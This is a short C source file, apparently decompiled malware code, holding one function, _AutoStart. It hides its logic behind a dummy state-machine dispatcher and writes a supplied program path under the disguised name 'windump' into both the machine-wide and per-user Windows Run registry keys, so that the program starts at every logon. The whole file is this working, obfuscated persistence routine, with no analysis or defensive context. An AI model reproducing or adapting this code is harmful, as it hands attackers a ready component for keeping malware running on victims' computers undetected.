#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>

#pragma optimize("", off)
void _AutoStart(BYTE *param_1)
{
    volatile int dummy_state = 1;
    LSTATUS LVar1;
    DWORD DVar2;
    HKEY local_10[3];

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    LVar1 = RegOpenKeyExA((HKEY)0x80000002, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    LVar1 = RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
